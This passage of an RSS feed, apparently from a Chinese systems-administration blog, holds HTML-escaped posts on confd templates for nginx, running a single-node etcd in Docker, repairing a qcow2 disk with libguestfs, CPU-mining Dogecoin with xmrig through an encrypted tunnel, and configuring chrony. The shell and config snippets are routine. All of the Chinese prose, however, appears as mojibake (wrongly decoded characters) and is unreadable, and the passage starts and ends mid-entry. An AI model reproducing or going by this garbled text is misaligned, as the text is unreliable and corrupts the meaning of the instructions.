&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;#34;/nginx/app01/upstream&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;check_cmd = &amp;#34;/usr/sbin/nginx -t&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;reload_cmd = &amp;#34;/usr/sbin/nginx -s reload&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOT&amp;gt;&amp;gt;/etc/confd/templates/nginx.conf.tmpl
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;upstream {{getv &amp;#34;/nginx/app01/subdomain&amp;#34;}} {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;{{range getvs &amp;#34;/nginx/app01/upstream/*&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    server {{.}};
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;{{end}}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;server {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    server_name  {{getv &amp;#34;/nginx/app01/subdomain&amp;#34;}}.example.com;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    location / {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        proxy_pass        http://{{getv &amp;#34;/nginx/app01/subdomain&amp;#34;}};
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        proxy_redirect    off;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        proxy_set_header  Host             $host;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        proxy_set_header  X-Real-IP        $remote_addr;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;confd ä¼šæ ¹æ® etcd çš„å€¼ï¼Œç»“åˆ nginx.conf.tmpl ï¼Œç”Ÿæˆ nginx-auto.confï¼Œç„¶å nginx -t éªŒè¯é€šè¿‡åï¼Œæ‰§è¡Œ nginx -s roladã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>etcdå•èŠ‚ç‚¹åº”ç”¨</title>
      <link>https://rendoumi.com/posts/20211021-etcd_docker/</link>
      <pubDate>Thu, 21 Oct 2021 11:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211021-etcd_docker/</guid>
      <description>&lt;p&gt;ç”±äºä½¿ç”¨åˆ°äº†é˜¿é‡Œçš„ K8S æ‰˜ç®¡é›†ç¾¤ ACKï¼Œäºæ˜¯æƒ³å ä¾¿å®œã€‚æƒ³ç”¨åˆ°æ‰˜ç®¡ master node çš„ etcd æ¥ä¿å­˜æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æœæ˜¯ï¼Œæœªé‚ï¼ï¼æ— æ³•ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;é˜¿é‡Œæœ‰å•ç‹¬çš„é…ç½®ç®¡ç†æœåŠ¡ï¼Œå¤æ‚åŒ–äº†ï¼Œä¸æƒ³ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œå¯åŠ¨åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å‰¯æœ¬çš„ etcd podï¼Œç„¶åæ•°æ®æŒä¹…åŒ–åˆ° OSS çš„ S3 æ¡¶ä¸­ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ–&#34;&gt;ä¸€ã€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ–&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬åªæƒ³åœ¨æµ‹è¯•ç¯å¢ƒä¸­è·‘ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcdï¼Œè¿˜æ²¡æœ‰ç”¨åˆ° k8sï¼Œåšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NODE1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.33
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;REGISTRY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;quay.io/coreos/etcd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# available from v3.2.5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#REGISTRY=gcr.io/etcd-development/etcd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -p 2379:2379 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -p 2380:2380 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --volume&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/data/etcd:/etcd-data &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --name etcd &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;REGISTRY&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:latest &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  /usr/local/bin/etcd &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --data-dir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etcd-data --name node1 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --initial-advertise-peer-urls http://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NODE1&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:2380 --listen-peer-urls http://0.0.0.0:2380 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --advertise-client-urls http://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NODE1&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:2379 --listen-client-urls http://0.0.0.0:2379 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --initial-cluster &lt;span class=&#34;nv&#34;&gt;node1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NODE1&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:2380
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸Šå°±å¯ä»¥äº†ï¼Œå®¹å™¨è·‘èµ·æ¥ä»¥åè¿›å…¥å®¹å™¨æµ‹è¯•ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it 425f26903466 /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;etcdctl -C http://127.0.0.1:2379 member list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;c3511611548b7c7c: &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;node1 &lt;span class=&#34;nv&#34;&gt;peerURLs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://172.18.31.33:2380 &lt;span class=&#34;nv&#34;&gt;clientURLs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://172.18.31.33:2379 &lt;span class=&#34;nv&#34;&gt;isLeader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;etcdctl ls --recursive /
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcd å°±å¼„å¥½äº†ï¼Œå¯¹å¤–æš´éœ²çš„æ˜¯ 2379 å’Œ 2380 ç«¯å£&lt;/p&gt;</description>
    </item>
    <item>
      <title>Libguestfsçš„æ•‘æ´æ‰‹æ®µ</title>
      <link>https://rendoumi.com/posts/20211021-libguestfs/</link>
      <pubDate>Thu, 21 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211021-libguestfs/</guid>
      <description>&lt;p&gt;åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æˆ‘ä»¬å¤§é‡ä½¿ç”¨äº† kvm çš„è™šæ‹ŸæŠ€æœ¯ï¼Œè™šæ‹Ÿæœºçš„é•œåƒç³»ç»Ÿä½¿ç”¨çš„æ˜¯ Cloud-init çš„æŠ€æœ¯&lt;/p&gt;
&lt;p&gt;ä¸å¯é¿å…çš„ï¼Œè™šæœºä¼šé­åˆ°å„ç§æŸåï¼Œç»´æŠ¤çš„æ‰‹æ®µå°±ååˆ†å¿…è¦äº†&lt;/p&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè™šæœºæ–‡ä»¶ vis-16-41-18.qcow2 åäº†&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…æ”¯æŒåŒ…&#34;&gt;ä¸€ã€å®‰è£…æ”¯æŒåŒ…&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install libguestfs libguestfs-tools
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒæŸ¥çœ‹æ—¥å¿—&#34;&gt;äºŒã€æŸ¥çœ‹æ—¥å¿—&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-log -a vis-16-41-18.qcow2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211021-libguestfs/image-20211021115044742.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æŠ¥é”™ä¿¡æ¯&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ&#34;&gt;ä¸‰ã€åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ&lt;/h2&gt;
&lt;p&gt;virt-filesystemså’Œvirt-dféƒ½å¯ä»¥ï¼Œç”¨virt-dfçœ‹çš„æ›´å¤šä¸€äº›&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-filesystems -l -a vis-16-41-18.qcow2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name       Type        VFS   Label  Size          Parent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1  filesystem  ext4  -      &lt;span class=&#34;m&#34;&gt;209715200&lt;/span&gt;     -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda2  filesystem  ext4  -      &lt;span class=&#34;m&#34;&gt;214536355840&lt;/span&gt;  -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-df -a vis-16-41-18.qcow2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Filesystem                           1K-blocks       Used  Available  Use%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vis-16-41-18.qcow2:/dev/sda1            &lt;span class=&#34;m&#34;&gt;194241&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;31706&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;152295&lt;/span&gt;   17%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vis-16-41-18.qcow2:/dev/sda2         &lt;span class=&#34;m&#34;&gt;206088704&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;5639856&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;189973444&lt;/span&gt;    3%
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å››æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤æ–¹æ³•1&#34;&gt;å››ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•1ï¼‰&lt;/h2&gt;
&lt;p&gt;ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° vis-16-41-18.qcow2 é‡Œé¢æœ‰ä¸¤ä¸ªåˆ†åŒºï¼Œ/dev/sda1 å’Œ/dev/sda2&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯/bootï¼Œç¬¬äºŒä¸ªæ˜¯/&lt;/p&gt;
&lt;p&gt;æŠŠ / mount å‡ºæ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;guestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ–è€…å…¨è‡ªåŠ¨mount&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•ç”¨CPUæŒ–ç‹—å¸Dogecoin</title>
      <link>https://rendoumi.com/posts/20211021-dogecoin/</link>
      <pubDate>Thu, 21 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211021-dogecoin/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸ªå¨±ä¹è¯é¢˜ï¼ŒDogecoin ç‹—å¸åœ¨é©¬æ–¯å…‹çš„å¹æ§é¼“åŠ¨ä¸‹ï¼Œå†²ä¸Šäº‘éœ„&lt;/p&gt;
&lt;p&gt;å…¶å®çœŸçš„ç”¨CPUæŒ–å¸ï¼Œåº”è¯¥æ˜¯æŒ– xmb é—¨ç½—å¸æ‰æ˜¯å¯¹çš„é€‰æ‹©ï¼ŒæŒ–ç‹—å¸åªæ˜¯å¨±ä¹ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸Šæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦æœ‰ä¸ªç‹—å¸é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶&#34;&gt;ä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211021-dogecoin/image-20211021101957637.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;äºŒåšå¥½åŠ å¯†é€šé“&#34;&gt;äºŒã€åšå¥½åŠ å¯†é€šé“&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“&lt;/p&gt;
&lt;p&gt;ç”¨ ghostunnel,    localhost:9999 &amp;mdash;&amp;gt; vps:9999 &amp;mdash;&amp;gt; rx.unmineable.com:3333&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ç”¨screenåå°å¼€æŒ–&#34;&gt;ä¸‰ã€ç”¨screenåå°å¼€æŒ–&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;screen
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#./xmrig -o localhost:9999 -a rx -k -u DOGE:ç‹—å¸åœ°å€.çŸ¿å·¥å#heyt-3711&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctrl+a+d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20211021102338089&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211021-dogecoin/image-20211021102338089.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å››æŸ¥çœ‹æŒ–äº†å¤šå°‘&#34;&gt;å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘&lt;/h2&gt;
&lt;p&gt;æŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/DOGE/address/&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211021102710484&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211021-dogecoin/image-20211021102710484.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Chronyçš„å‡ ä¸ªè¯¦ç»†é…ç½®ç»†èŠ‚</title>
      <link>https://rendoumi.com/posts/20211020-chrony/</link>
      <pubDate>Wed, 20 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211020-chrony/</guid>
      <description>&lt;p&gt;chrony å·²ç»æˆäº†äº‹å®æ ‡å‡†ï¼Œæ›¿ä»£äº†ntpã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼Œéœ€è¦éå¸¸æ³¨æ„ã€‚&lt;/p&gt;
&lt;p&gt;ç»™å‡ºæˆ‘ä»¬çš„é…ç½®ï¼Œ/etc/chrony.conf&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Use public servers from the pool.ntp.org project.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Please consider joining the pool (http://www.pool.ntp.org/join.html).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;server 172.10.1.1 iburst prefer minpoll 6 maxpoll 10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;server 172.10.1.2 iburst&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Record the rate at which the system clock gains/losses time.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;driftfile /var/lib/chrony/drift&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Allow the system clock to be stepped in the first three updates&lt;/span&gt;
